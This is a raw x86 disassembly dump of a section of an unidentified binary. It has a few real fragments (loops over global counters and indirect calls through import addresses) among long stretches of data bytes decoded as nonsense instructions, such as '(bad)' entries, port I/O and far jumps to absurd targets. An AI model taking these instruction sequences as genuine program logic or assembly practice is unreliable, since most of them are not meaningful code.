  41206d:	cmovbe esi,DWORD PTR [ebx]
  412070:	inc    esp
  412071:	clc    
  412072:	cs sbb dl,al
  412075:	ins    BYTE PTR es:[edi],dx
  412076:	mov    eax,ds:0xaa3330d8
  41207b:	or     DWORD PTR [ebp+0x7d],eax
  41207e:	or     ecx,eax
  412080:	not    al
  412082:	pop    ebp
  412083:	popf   
  412084:	cmp    esp,DWORD PTR [ecx+0x2b]
  412087:	dec    edx
  412088:	mov    BYTE PTR [esi],bh
  41208a:	sbb    eax,0x651b879b
  41208f:	and    al,0xc0
  412091:	push   edx
  412092:	lods   eax,DWORD PTR ds:[esi]
  412093:	mov    esi,edx
  412095:	imul   esi,DWORD PTR [ebx+ecx*8-0x6caabb62],0xe8924f69
  4120a0:	out    0x44,al
  4120a2:	cmp    cl,dh
  4120a4:	jl     0x41206c
  4120a6:	xor    DWORD PTR [edi-0x66],ebx
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fcf6
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fc55
  4120d3:	adc    DWORD PTR ds:0x42e66f,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e66b,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e683,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e67b,0x19
  412102:	cmp    DWORD PTR ds:0x42e67b,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e67b,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fcfe
  412121:	push   0x0
  412123:	push   0x42e1ed
  412128:	call   DWORD PTR ds:0x42e403
  41212e:	mov    ebx,DWORD PTR ds:0x42e67b
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e67b,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e0a0,0x42fc81
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	call   0x4704bd29
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xd770707e
  41217a:	jle    0x412111
  41217c:	add    al,0xf4
  41217e:	in     al,0x2d
  412180:	scas   eax,DWORD PTR es:[edi]
  412181:	and    ebp,DWORD PTR [edi+0x43]
  412184:	add    eax,0x698d7606
  412189:	dec    ebp
  41218a:	lds    ebp,FWORD PTR [edi+edx*1]
  41218d:	lahf   
  41218e:	or     DWORD PTR [edx+esi*1],edi
  412191:	(bad)  
  412192:	outs   dx,BYTE PTR ds:[esi]
  412193:	jg     0x412196
  412195:	push   edi
  412196:	mov    bl,0xa9
  412198:	cmp    ebp,ecx
  41219a:	call   0x79a1:0x98a02d1b
  4121a1:	inc    esi
  4121a2:	adc    eax,esp
  4121a4:	dec    ebx
  4121a5:	mov    dh,dl
  4121a7:	inc    esp
  4121a8:	bound  eax,QWORD PTR [ecx+0x6e]
  4121ab:	lock jmp 0x4121ad
  4121ae:	push   edx
  4121af:	or     esi,DWORD PTR [ecx+0x2b]
  4121b2:	xchg   bl,bl
  4121b4:	add    eax,edx
  4121b6:	ins    BYTE PTR es:[edi],dx
  4121b7:	test   BYTE PTR [edi],al
  4121b9:	inc    edx
  4121ba:	dec    ebx
  4121bb:	mov    ds:0x13ba627a,eax
  4121c0:	or     al,0x55
  4121c2:	pop    ds
  4121c3:	cmp    DWORD PTR [ecx],ecx
  4121c5:	add    DWORD PTR [eax],0xffffffa7
  4121c8:	call   0x1224:0xe4449a2c
  4121cf:	xchg   ebp,eax
  4121d0:	pop    edx
  4121d1:	jg     0x412224
  4121d3:	repnz mov ch,0xcb
  4121d6:	cmp    al,0x7b
  4121d8:	inc    ecx
  4121d9:	das    
  4121da:	pusha  
  4121db:	clc    
  4121dc:	mov    ss,ebp
  4121de:	fisttp QWORD PTR [edi-0x4]
  4121e1:	fsubrp st(3),st
  4121e3:	dec    edi
  4121e4:	jmp    0xf92bb10f
  4121e9:	xchg   ebx,eax
  4121ea:	mov    esi,gs
  4121ec:	cmp    ch,BYTE PTR [eax+0x33]
  4121ef:	or     eax,0x43f7b2bb
  4121f4:	jmp    0x39db:0x20547fe9
  4121fb:	mov    edi,fs
  4121fd:	mov    BYTE PTR [edi-0x38],al
  412200:	cmp    al,0x3d
  412202:	mov    esp,0x6160feb
  412207:	aam    0xb5
  412209:	shr    BYTE PTR [edx],0xc2
  41220c:	and    bh,dh
  41220e:	leave  
  41220f:	hlt    
  412210:	and    BYTE PTR [ecx-0x31],al
  412213:	outs   dx,DWORD PTR ds:[esi]
  412214:	push   edx
  412215:	mov    dl,0x79
  412217:	dec    ebx
  412218:	lods   eax,DWORD PTR ds:[esi]
  412219:	fsub   DWORD PTR [ebp-0x75]
  41221c:	ffree  st(4)
  41221e:	pop    edx
  41221f:	out    dx,al
  412220:	cmp    ch,BYTE PTR [edi+0x3460523f]
  412226:	sbb    edx,DWORD PTR [ebx]
  412228:	cwde   
  412229:	push   es
  41222a:	sub    DWORD PTR [ebp-0x45cd2a35],eax
  412230:	in     al,dx
  412231:	jb     0x4121d1
  412233:	daa    
  412234:	jle    0x412256
  412236:	(bad)  
  412237:	std    
  412238:	loopne 0x412282
  41223a:	dec    cx
  41223c:	je     0x41225d
  41223e:	ror    BYTE PTR [edi+eiz*1],cl
  412241:	xor    al,BYTE PTR [esi+0x6d]
  412244:	xchg   BYTE PTR [ebx+0x5e91f66e],bl
  41224a:	aas    
  41224b:	push   es
  41224c:	push   ss
  41224d:	mov    ecx,0xf387d06a
  412252:	or     edx,DWORD PTR [edx+0x3754af41]
  412258:	lods   al,BYTE PTR ds:[esi]
  412259:	call   0xd70c:0xa2a475e8
  412260:	sub    ebx,DWORD PTR [edx+0x71]
  412263:	sti    
  412264:	ins    BYTE PTR es:[edi],dx
  412265:	pop    ss
  412266:	jle    0x4121ff
  412268:	xchg   edi,eax
  412269:	fs ds rol ecx,1
  41226d:	mov    ecx,0xfdbce1bf
  412272:	sub    esi,DWORD PTR [esi-0x1925131b]
  412278:	mov    cl,cl
  41227a:	shr    BYTE PTR [eax+0x25],cl
  41227d:	xor    eax,0xa2454308
  412282:	xchg   ecx,eax
  412283:	mov    dl,0x9c
  412285:	call   0x50d0:0x548c49b1
  41228c:	push   cs
  41228d:	jle    0x4122f7
  41228f:	dec    ebx
  412290:	dec    esp
  412291:	xor    al,0x9d
  412293:	mov    esi,0xdba291c
  412298:	out    0xec,eax
  41229a:	cmovno esp,DWORD PTR [esi+0x7d]
  41229e:	call   0x72d9:0xe6f67db7
  4122a5:	mov    ds:0xa445563a,eax
  4122aa:	test   DWORD PTR [ecx-0x575c2b34],0x77b01509
  4122b4:	shl    BYTE PTR [esi+0x21],0x62
  4122b8:	sub    BYTE PTR [edx-0x28],dl
  4122bb:	xchg   bl,bl
  4122bd:	sub    DWORD PTR [ecx-0x51],ecx
  4122c0:	shl    BYTE PTR [eax-0x48],1
  4122c3:	scas   eax,DWORD PTR es:[edi]
  4122c4:	stos   BYTE PTR es:[edi],al
  4122c5:	cs loope 0x4122ab
  4122c8:	sbb    al,0x91
  4122ca:	fsub   st,st(3)
  4122cc:	sub    BYTE PTR [edx-0x50ca4a2],ch
  4122d2:	das    
  4122d3:	mov    ebp,0xbaa36279
  4122d8:	mov    ebx,DWORD PTR [edx+esi*8]
  4122db:	jmp    0x45bd:0x84e22088
  4122e2:	mov    ch,0xd9
  4122e5:	mov    ebp,0xa527530a
  4122ea:	lods   eax,DWORD PTR ds:[esi]
  4122eb:	shl    BYTE PTR [eax+ebp*4-0x4a],0xa9
  4122f0:	pushf  
  4122f1:	fistp  QWORD PTR [ecx]
  4122f3:	aam    0x38
  4122f5:	add    eax,edx
  4122f7:	mov    ds:0xb2994d14,eax
  4122fc:	or     al,0x7
  4122fe:	in     eax,0x98
  412300:	repz fsubp st(1),st
  412303:	int    0x29
  412305:	mov    dh,0x46
  412307:	out    dx,al
  412308:	outs   dx,DWORD PTR ds:[esi]
  412309:	jo     0x412296
  41230b:	xlat   BYTE PTR ds:[ebx]
  41230c:	sbb    eax,0xf409e19f
  412311:	(bad)  
  412313:	popf   
  412314:	xchg   BYTE PTR [edx+eiz*1+0x7fef2f60],dh
  41231b:	adc    BYTE PTR [ebx-0x2ac71c3f],ah
  412321:	add    DWORD PTR [ebp+0x25db4fb8],eax
  412327:	fdiv   DWORD PTR [eax]
  412329:	jmp    0x6482:0x4be0e1cc
  412330:	sub    eax,0x2f05650f
  412335:	aaa    
  412336:	cmp    dl,BYTE PTR [eax-0x324470d1]
  41233c:	pop    eax
  41233d:	mov    esp,0x5db02aef
  412342:	jne    0x4122e2
  412344:	jnp    0x41238c
  412346:	test   al,0x9c
  412348:	push   es
  412349:	stos   DWORD PTR es:[edi],eax
  41234a:	les    esp,FWORD PTR [ecx+0x67ef5021]
  412350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412351:	arpl   WORD PTR [eax],cx
  412353:	inc    esp
  412354:	(bad)  
  412355:	bnd ja 0x4123c2
  412358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412359:	in     al,0x2b
  41235b:	dec    esi
  41235c:	sbb    ah,cl
  41235e:	push   ds
  41235f:	and    bh,BYTE PTR ds:0xa81df301
  412365:	or     DWORD PTR ss:[eax+0x7f6c2fec],edi
  41236c:	jmp    0xb22d:0x1ef81f2f
  412373:	rcr    BYTE PTR [ecx-0x4a9022a6],cl
  412379:	int    0xb3
  41237b:	inc    ebp
  41237c:	lds    ebx,FWORD PTR [ebp+0x43]
  41237f:	xchg   ecx,eax
  412380:	scas   al,BYTE PTR es:[edi]
  412381:	mov    ah,0xfb
  412383:	xchg   ebp,eax
  412384:	cli    
  412385:	jge    0x412381
  412387:	adc    DWORD PTR [ebx],0xb132bed4
  41238d:	xor    eax,0xa3cd9927
  412392:	mov    ebp,0x66f1af01
  412397:	retf   0x321
  41239a:	das    
  41239b:	jae    0x4123dd
  41239d:	fld    QWORD PTR [ebp-0x4d]
  4123a0:	rol    DWORD PTR [edx],1
  4123a2:	ins    DWORD PTR es:[edi],dx
  4123a3:	retf   0xde9f
  4123a6:	cli    
  4123a7:	outs   dx,BYTE PTR ds:[esi]
  4123a8:	mov    cl,0x16
  4123aa:	sbb    eax,0x16e82065
  4123af:	add    ch,BYTE PTR [ebx+0x3978dbc6]
  4123b5:	out    dx,eax
  4123b6:	xchg   ebx,eax
  4123b7:	xor    ah,al
  4123b9:	sub    eax,0xb73dc005
  4123be:	clc    
  4123bf:	fwait
  4123c0:	sbb    al,0x79
  4123c2:	test   BYTE PTR [edx],dh
  4123c4:	cmc    
  4123c5:	xor    BYTE PTR [eax+0x40],dl
  4123c8:	sub    edx,DWORD PTR [esi+0x69937f5d]
  4123ce:	adc    ch,BYTE PTR [ebp-0x52]
  4123d1:	cmp    ecx,DWORD PTR [edi-0xe]
  4123d4:	inc    eax
  4123d5:	jmp    0x41237c
  4123d7:	test   eax,0xc3080c21
  4123dc:	shl    DWORD PTR [ebx+ebx*8],0x61
  4123e0:	pop    ss
  4123e1:	mov    ecx,0x640ec44c
  4123e6:	sahf   
  4123e7:	sbb    DWORD PTR [ecx+0x7f],esi
  4123ea:	mov    ds:0xdd592634,eax
  4123ef:	mov    DWORD PTR [edi],ebp
  4123f1:	(bad)  
  4123f2:	mov    dl,0xfe
  4123f4:	inc    esp
  4123f5:	adc    BYTE PTR [ecx],dl
  4123f7:	lahf   
  4123f8:	ret    0x9c06
  4123fb:	out    0xf3,al
  4123fd:	repz mov al,0x9b
  412400:	xchg   esi,eax
  412401:	jp     0x4123cc
  412403:	xchg   esp,eax
  412404:	jl     0x41245c
  412406:	(bad)  
  412407:	push   ebx
  412408:	hlt    
  412409:	and    DWORD PTR [edx],ebx
  41240b:	fcmovne st,st(7)
  41240d:	into   
  41240e:	iret   
  41240f:	mov    edi,0xa655cbb5
  412414:	int    0xbf
  412416:	in     al,dx
  412417:	jns    0x412496
  412419:	jecxz  0x412440
  41241b:	loop   0x412448
  41241d:	cmc    
  41241e:	mov    edx,0x7d59cfe6
  412423:	sbb    al,0xc6
  412425:	rcr    DWORD PTR [ebx+0x10e4e08],cl
  41242b:	icebp  
  41242c:	sahf   
  41242d:	test   eax,0xb15fc07b
  412432:	rol    BYTE PTR [ecx],cl
  412434:	and    BYTE PTR [edx+0x311348ee],ah
  41243a:	and    DWORD PTR [esi-0x7f],eax
  41243d:	pop    ebp
  41243e:	pusha  
  41243f:	leave  
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fc79,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	pop    ds
  41245e:	call   0x5cd1161b
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x2d70707e
  41246a:	xchg   BYTE PTR [ecx-0x867df1],ch
  412470:	fimul  WORD PTR [edx+edi*8-0x49]
  412474:	mov    al,ds:0x8ac29848
  412479:	sbb    al,0xf4
  41247b:	jle    0x412494
  41247d:	xor    DWORD PTR [ebx-0x7d],0xffffffc5
  412481:	lds    esp,FWORD PTR [edi+eiz*4-0x4f]
  412485:	cs es test al,0x19
  412489:	outs   dx,BYTE PTR ds:[esi]
  41248a:	add    esp,DWORD PTR [ebx]
  41248c:	lods   eax,DWORD PTR ds:[esi]
  41248d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41248e:	sti    
  41248f:	xchg   DWORD PTR [edi],esp
  412491:	cmc    
  412492:	and    bl,BYTE PTR [eax]
  412494:	sbb    ecx,DWORD PTR [ebp-0xc2ffe7a]
  41249a:	mov    ds:0x2fdd39df,al
  41249f:	push   edi
  4124a0:	adc    al,0xe1
  4124a2:	xchg   ebx,eax
  4124a3:	fiadd  DWORD PTR [esi-0x4e5df448]
  4124a9:	sbb    bl,ch
  4124ab:	mov    bl,0x4
  4124ad:	push   cs
  4124ae:	jne    0x4124bd
  4124b0:	xlat   BYTE PTR ds:[ebx]
  4124b1:	push   es
  4124b2:	int3   
  4124b3:	ds repnz mov cl,0x82
  4124b7:	std    
  4124b8:	jg     0x4124db
  4124ba:	sub    eax,0x312983f4
  4124bf:	push   esp
  4124c0:	stos   DWORD PTR es:[edi],eax
  4124c1:	repz and esp,esp
  4124c4:	aaa    
  4124c5:	jno    0x4124e0
  4124c7:	lock adc DWORD PTR [edx+0x1b],0xffffff94
  4124cc:	lahf   
  4124cd:	dec    BYTE PTR [edi-0x5fb601d5]
  4124d3:	fwait
  4124d4:	iret   
  4124d5:	pop    esp
  4124d6:	loope  0x41248b
  4124d8:	ss mov al,0xa8
  4124db:	faddp  st(7),st
  4124dd:	or     esp,DWORD PTR [edx-0x1a]
  4124e0:	jmp    0x412510
  4124e2:	cmp    dl,0x9a
  4124e5:	leave  
  4124e6:	or     eax,0x4d819df1
  4124eb:	mov    al,ds:0xcce0ca1a
  4124f0:	xchg   BYTE PTR [ecx+0x3f6fff4c],cl
  4124f6:	jae    0x412498
  4124f8:	mov    DWORD PTR [esi+0x419f6a1f],ebx
  4124fe:	inc    esi
  4124ff:	or     eax,0x4cc798e1
  412504:	les    esi,FWORD PTR ds:0x4a4da26a
  41250a:	mov    dh,0x92
  41250c:	add    DWORD PTR [edi-0x6af44e58],0x1f
  412513:	jecxz  0x4124c7
  412515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412516:	and    eax,0x53007201
  41251b:	push   ss
  41251c:	dec    edx
  41251d:	stos   BYTE PTR es:[edi],al
  41251e:	fsubr  QWORD PTR ds:0xf59c4941
  412524:	cmp    BYTE PTR [ebx+0x5dd15576],0x29
  41252b:	mov    bh,0xcf
  41252d:	test   al,0xda
  41252f:	mov    WORD PTR [ebp+0x61b59aca],?
  412535:	mov    ebx,0x5d8b7fee
  41253a:	xchg   edx,eax
  41253b:	bound  ecx,QWORD PTR [esi+0x1234c783]
  412541:	pop    es
  412542:	or     al,0xfd
  412544:	push   esi
  412545:	fild   DWORD PTR [ecx+0x50]
  412548:	or     ebp,DWORD PTR [ebx+0x4cbbe2be]
  41254e:	xor    ebp,edx
  412550:	mov    dh,0x65
  412552:	cmp    al,ch
  412554:	jmp    0x4125ce
  412556:	fs lahf 
  412558:	cmp    BYTE PTR [edi+0x65],al
  41255b:	jl     0x41258f
  41255d:	inc    edi
  41255e:	xchg   ebp,eax
  41255f:	(bad)  [edi]
  412561:	xchg   ecx,eax
  412562:	lods   al,BYTE PTR ds:[esi]
  412563:	loop   0x412513
  412565:	not    BYTE PTR ds:0xca62b1be
  41256b:	test   eax,0xc3533b87
  412570:	rol    BYTE PTR [esi-0x5633e7a2],0xd9
  412577:	gs mov dh,0xc3
  41257a:	mov    WORD PTR [eax+0x75],gs
  41257d:	sti    
  41257e:	jns    0x41254f
  412580:	aad    0xa9
  412582:	jle    0x4125b5
  412584:	cmp    ch,BYTE PTR [ecx+edi*2]
  412587:	loope  0x412553
  412589:	aam    0x84
  41258b:	(bad)  [esi+0x36dbafe8]
  412591:	pop    ebp
  412592:	clc    
  412593:	push   cs
  412594:	mov    dl,0x95
  412596:	jp     0x4125de
  412598:	push   esp
  412599:	icebp  
  41259a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41259b:	xchg   ebp,eax
  41259c:	pop    ecx
  41259d:	pop    esp
  41259e:	inc    ecx
  41259f:	push   0xb41aaef0
  4125a4:	retf   
  4125a5:	inc    ecx
  4125a6:	sbb    eax,0x11c76118
  4125ab:	cld    
  4125ac:	mov    esp,0x9bb5eef2
  4125b1:	dec    ebx
  4125b2:	dec    ebx
  4125b3:	clc    
  4125b4:	int3   
  4125b5:	mov    al,ds:0xfaab4a1d
  4125ba:	mov    esp,0xd2d9d034
  4125bf:	inc    edi
  4125c0:	or     al,0xa
  4125c2:	out    dx,eax
  4125c3:	inc    ebx
  4125c4:	add    al,0xf
  4125c6:	imul   ebp,DWORD PTR [edx+eax*4],0xffffffa7
  4125ca:	mov    cl,0x9
  4125cc:	bound  ecx,QWORD PTR [ecx]
  4125ce:	jb     0x412602
  4125d0:	adc    ecx,edi
  4125d2:	cmp    ebx,DWORD PTR [esi+edi*8+0x149c96f9]
  4125d9:	push   ds
  4125da:	mov    al,0xee
  4125dc:	cmp    ecx,eax
  4125de:	xor    al,0x6
  4125e0:	jb     0x41262a
  4125e2:	cdq    
  4125e3:	lock push ebp
  4125e5:	call   0x27d6:0x2511f802
  4125ec:	add    BYTE PTR [eax+0x7f],al
  4125ef:	stc    
  4125f0:	adc    eax,0x44887e7f
  4125f5:	out    dx,al
  4125f6:	ja     0x41258a
  4125f8:	fsubr  st,st(4)
  4125fa:	mov    ch,bl
  4125fc:	xchg   ecx,eax
  4125fd:	jns    0x412656
  4125ff:	mov    ch,0xc
  412601:	loopne 0x4125ef
  412603:	mov    al,0x4a
  412605:	mov    cl,0x81
  412607:	or     esp,DWORD PTR fs:[ebp+0x25]
  41260b:	xlat   BYTE PTR ds:[ebx]
  41260c:	jae    0x412619
  41260e:	loopne 0x41259a
  412610:	es mov cl,0x38
  412613:	rol    DWORD PTR [edi-0x9],0xbf
  412617:	pop    eax
  412618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412619:	mov    ?,WORD PTR [edx-0x427ee42f]
  41261f:	leave  
  412620:	fldcw  WORD PTR [esi+esi*4+0x7bb9b702]
  412627:	adc    ebx,DWORD PTR [esi-0x4be3a4e9]
  41262d:	inc    esi
  41262e:	imul   esp,DWORD PTR [ebx],0x44df7ed2
  412634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412635:	and    edx,DWORD PTR [ebx-0x7e]
  412638:	or     al,0x49
  41263a:	dec    eax
  41263b:	test   eax,0x17eb31b5
  412640:	inc    edi
  412641:	retf   
  412642:	dec    esi
  412643:	push   es
  412644:	sbb    ebp,esi
  412646:	loopne 0x41264f
  412648:	pop    edx
  412649:	(bad)  
  41264a:	sbb    eax,0x61bc60fd
  41264f:	cmp    ebx,esp
  412651:	lock sar cl,cl
  412654:	test   eax,0x5c057617
  412659:	push   esp
  41265a:	mov    ecx,0xdabc3abe
  41265f:	jecxz  0x4125f4
  412661:	adc    esi,eax
  412663:	mov    ds:0xba3625ef,al
  412668:	jl     0x41261a
  41266a:	ins    BYTE PTR es:[edi],dx
  41266b:	jecxz  0x412615
  41266d:	ret    
  41266e:	imul   eax,DWORD PTR [edi+0x7e],0x3a
  412672:	aad    0x6c
  412674:	pusha  
  412675:	(bad)  [edi]
  412677:	xor    eax,0x70cf7bcf
  41267c:	inc    esi
  41267d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41267e:	dec    ebp
  41267f:	test   eax,0x65d3109
  412684:	jg     0x4126e0
  412686:	aad    0xfe
  412688:	fsubr  st,st(6)
  41268a:	inc    ebp
  41268b:	shl    DWORD PTR [eax],0x33
  41268e:	adc    BYTE PTR [esi+0x46],bl
  412691:	int    0x2f
  412693:	dec    ecx
  412694:	fisub  DWORD PTR [esi-0x25]
  412697:	mov    BYTE PTR [ebx+0x7f91704a],dh
  41269d:	add    al,0xe3
  41269f:	jmp    0x4393:0xd251ad96
  4126a6:	ins    BYTE PTR es:[edi],dx
  4126a7:	outs   dx,BYTE PTR ds:[esi]
  4126a8:	add    eax,DWORD PTR [eax-0x76]
  4126ab:	leave  
  4126ac:	xchg   ecx,eax
  4126ad:	mov    al,0x91
  4126af:	push   0xffffffd4
  4126b1:	sbb    al,0x4e
  4126b3:	pop    ebx
  4126b4:	sub    eax,0x9e44406f
  4126b9:	sbb    dh,bl
  4126bb:	out    dx,eax
  4126bc:	jmp    0xe0479e5e
  4126c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126c2:	out    0xe6,eax
  4126c4:	pop    es
  4126c5:	call   0x666e4550
  4126ca:	ins    BYTE PTR es:[edi],dx
  4126cb:	daa    
  4126cc:	jl     0x41267a
  4126ce:	call   0xfe0b8515
  4126d3:	jns    0x412689
  4126d5:	ins    BYTE PTR es:[edi],dx
  4126d6:	mov    al,ds:0x7e91e9d0
  4126db:	fistp  WORD PTR [ecx]
  4126dd:	enter  0x9416,0xc3
  4126e1:	pop    ebx
  4126e2:	or     ah,ch
  4126e4:	pop    edx
  4126e5:	mov    WORD PTR [edi-0x1af115ad],fs
  4126eb:	push   es
  4126ec:	out    0xbb,al
  4126ee:	sbb    DWORD PTR [ebx+ebx*8-0x4e90fe12],ebx
  4126f5:	and    bl,ah
  4126f7:	cmp    DWORD PTR [ebx],eax
  4126f9:	(bad)  [ebp-0x55]
  4126fc:	dec    ebx
  4126fd:	mov    BYTE PTR [eax+0x75],al
  412700:	mov    BYTE PTR [eax],bh
  412702:	cmp    DWORD PTR [ebx],ecx
  412704:	jns    0x4126c0
  412706:	in     al,dx
  412707:	jle    0x412757
  412709:	sar    BYTE PTR [edi],0xde
  41270c:	sub    al,0x64
  41270e:	lea    eax,[ebx-0x5d]
  412711:	push   edx
  412712:	pop    ss
  412713:	outs   dx,BYTE PTR ds:[esi]
  412714:	cmp    BYTE PTR [esi-0x7b0be548],al
  41271a:	fld    st(0)
  41271c:	mov    ecx,0x3e3ca027
  412721:	sub    eax,0xae713f72
  412726:	mov    eax,ds:0xe3776f32
  41272b:	pushf  
  41272c:	outs   dx,BYTE PTR ds:[esi]
  41272d:	jbe    0x4126e5
  41272f:	popa   
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fcf6,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fcf6
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fcf6,ecx
  412751:	cmp    DWORD PTR ds:0x42fcf6,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fcf6,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e293
  41277c:	cmp    DWORD PTR ds:0x42fcf6,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fcf6
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fcf6,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fcee,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    esi,DWORD PTR [edi-0x45]
  4127bf:	fst    DWORD PTR [edi-0x38]
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0x5070707e
  4127ca:	das    
  4127cb:	cld    
  4127cc:	imul   DWORD PTR [edx-0x57e14744]
  4127d2:	push   ecx
  4127d3:	push   ebp
  4127d4:	xchg   esp,eax
  4127d5:	mov    ebp,0x57bfae41
  4127da:	push   edx
  4127db:	jno    0x41281b
  4127dd:	push   es
  4127de:	jae    0x41276c
  4127e0:	in     eax,0xa6
  4127e2:	es pop edi
  4127e4:	mov    ebx,0xd98240bc
  4127e9:	mov    ebx,0x12c15160
  4127ee:	xor    eax,0xed5dcfea
  4127f3:	lock xchg ecx,eax
  4127f5:	int3   
  4127f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127f7:	and    eax,0x8a56657f
  4127fc:	icebp  
  4127fd:	xchg   edx,eax
  4127fe:	pop    ss
  4127ff:	jne    0x4127b1
  412801:	out    0xf2,al
  412803:	mov    eax,ds:0xbb88fb9c
  412808:	mov    ds:0x9fc2bfcc,eax
  41280d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41280e:	mov    ecx,0x266e9f57
  412813:	inc    esi
  412814:	ret    0x8c2e
  412817:	and    ecx,DWORD PTR [ecx+0x4b010e2e]
  41281d:	sub    ebx,0x2b3f9e46
  412823:	jns    0x412800
  412825:	inc    esp
  412826:	fild   DWORD PTR [ebp-0x3f5ea575]
  41282c:	or     DWORD PTR [ebp-0x3c],0xed704b90
  412833:	pop    ecx
  412834:	jle    0x41281f
  412836:	xor    bh,0xb
  412839:	icebp  
  41283a:	pop    esp
  41283b:	push   eax
  41283c:	jne    0x412818
  41283e:	inc    edi
  41283f:	sbb    bl,BYTE PTR [esp+eiz*8+0x64]
  412843:	inc    edi
  412844:	out    0xf9,eax
  412846:	sbb    BYTE PTR [edi-0x185494ac],al
  41284c:	rcr    BYTE PTR [edi],1
  41284e:	cdq    
  41284f:	mov    ds:0xa74c61e4,eax
  412854:	inc    ecx
  412855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412856:	ins    BYTE PTR es:[edi],dx
  412857:	and    eax,0xf61ea1eb
  41285c:	xor    eax,0x3ee7ce3
  412861:	aas    
  412862:	jbe    0x4127fd
  412864:	push   eax
  412865:	push   ds
  412866:	in     al,0x33
  412868:	out    dx,al
  412869:	mov    ebx,0x58aaaa81
  41286e:	not    BYTE PTR [ebx+eiz*8-0x78f1eb92]
  412875:	(bad)  
  412876:	mov    bh,0x46
  412878:	push   esi
  412879:	inc    ecx
  41287a:	mov    edi,0x9ed6d84b
  41287f:	dec    ebp
  412880:	adc    al,0x7b
  412882:	cmp    ch,BYTE PTR [eax-0x7a1a9fe]
  412888:	cmp    DWORD PTR [eax+0x37],edi
  41288b:	xchg   edi,eax
  41288c:	adc    bl,BYTE PTR [esi+0x2a2b7411]
  412892:	and    al,0x4a
  412894:	js     0x41285e
  412896:	call   0x970a648e
  41289b:	mov    DWORD PTR [ebp+0x1141c65f],ebp
  4128a1:	shl    BYTE PTR [edi-0x7b],1
  4128a4:	sub    bh,ch
  4128a6:	add    al,0x27
  4128a8:	out    dx,al
  4128a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128aa:	add    eax,DWORD PTR [ebx-0x7c327431]
  4128b0:	jnp    0x412841
  4128b2:	inc    edi
  4128b3:	pusha  
  4128b4:	fwait
  4128b5:	xchg   ecx,eax
  4128b6:	pop    edx
  4128b7:	loop   0x4128c0
  4128b9:	ss mov dh,cl
  4128bc:	or     al,0x44
  4128be:	retf   
  4128bf:	and    al,0x40
  4128c1:	aaa    
  4128c2:	xor    ecx,DWORD PTR [eax-0x49f21bd0]
  4128c8:	jbe    0x4128ea
  4128ca:	pop    edi
  4128cb:	pusha  
  4128cc:	push   es
  4128cd:	stos   BYTE PTR es:[edi],al
  4128ce:	and    eax,0xdc7760e
  4128d3:	ja     0x41294f
  4128d5:	mov    eax,ds:0xe7d6c3bf
  4128da:	nop
  4128db:	mov    edx,ecx
  4128dd:	push   eax
